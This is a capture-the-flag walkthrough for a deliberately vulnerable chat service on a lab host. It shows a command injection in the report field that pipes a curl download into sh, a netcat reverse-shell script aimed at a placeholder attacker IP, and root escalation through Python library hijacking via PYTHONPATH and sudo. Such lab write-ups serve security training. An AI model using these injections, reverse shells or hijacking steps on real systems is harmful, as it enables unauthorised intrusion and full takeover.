# Enumeration

## \[+] 10.10.80.134 - jpgchat.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.80.134 jpgchat.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.80.134
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

# Initial Foothold

## Port 3000 - TCP

### \[-] wes\@ubuntu-xenial

We can use [Netcat](https://linux.die.net/man/1/nc) to interact with this port by using the following command:

```sh
nc jpgchat.thm 3000
```

In the welcome banner, we find a note that let's us know where to find the source code of the application. Searching for "jpgchat github" leads us to [this GitHub page](https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py).

On lines 13 and 14, we will find that submitting a report directly takes user input and stores it as variables (`your_name` and `your_report`) then uses it in a `bash` command without any input sanitization. Also, using the `os.system` function along with `bash` is not necessary as `os.system` can run commands as well:

![c49b6c97a6a43e80752c4bb864c8a715.png](/resources/9ab2b0b917384a7f9094c7c8a176199a.png)

We can inject our own malicious commands in either of the variables (`your_name` or `your_report`) and the victim machine will run it. When we use a name like `test; <COMMAND>`, the semicolon (`;`) will end the command in the code and begin running the next command after. Essentially, it's like hitting `ENTER` after each command.

To get a reverse shell, we will send a `curl` command to the victim machine that will download a bash script with our reverse shell and pipe it to bash.

First, create a text file named `shell.sh` with the following code:

```sh
#!/usr/bin/env bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Host the script using `python3`:

```sh
python3 -m http.server 8888
```

Now that we are setup, we can inject our command in the report function of the vulnerable application. Connect to the service again using `nc` then type `[REPORT]` to fill out the report form.

```sh
nc jpgchat.thm 3000
[REPORT]
test; curl '10.13.57.211:8888/shell.sh' | sh;
test
```

Back on our Netcat listener we should have a connection back from the victim:

Let's stablize the shell we just got by doing the following steps:

1. Use Python to spawn a stable shell:
   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```
2. `CTRL+Z` to background the current shell
3. Fix echoing and foregrounds the shell:
   ```sh
   stty raw -echo;fg
   ```
4. Set terminal to use 256 colors:
   ```sh
   export TERM=xterm-256color
   ```

We can find the user flag in `/home/wes/user.txt`:

```sh
cd /home/wes/
ls -lah
cat user.txt
```

# Privilege Escalation

### \[-] root\@ubuntu-xenial

Checking our sudo privileges for the user `wes` shows two important things:

1. The `env_keep` directive specifices which environment variables should be preserved when running commands with `sudo`. The `+=` notation means that the `PYTHONPATH` variable is added to the list of environment variables to be preserved, without affecting other existing settings.
2. We can run a Python script with root permissions

```sh
sudo -l
```

![8ff913f01f24c7ee2fd08c0031b734e0.png](/resources/d0c5abf3e7bf4e0e836a727c50cf817b.png)

Next, we will check the permissions of the script which we will find that is read-only for us:

```sh
ls -la /opt/development/test_module.py
```

![147f518ce4fd4644f628e04d0a2d13c0.png](/resources/f2f74104589a411ba8372d61f1db31a7.png)

Since we have read access, let's print the source code of the script to see what it's doing:

```sh
cat /opt/development/test_module.py
```

`test_module.py`:

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

The script is using a wildcard symbol (`*`) which will import everything from the `compare` module. We can create our own malicious module and set the `PYTHONPATH` environment variable to point it so that we can run our malicious code with root privileges. This is called [Python library hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/).

To begin, we will create a text file named `compare.py` and import the `os` module so we can run system commands via Python and use it to spawn a bash shell which will be running as the `root` user.

```sh
cd ~
cat > compare.py << EOF
import os
os.system('/bin/bash')
EOF
chmod +x compare.py
export PYTHONPATH=/home/wes
sudo /usr/bin/python3 /opt/development/test_module.py
```

We can find the root flag in `/root/root.txt`:

```sh
ls -lah /root
cat /root/root.txt
```
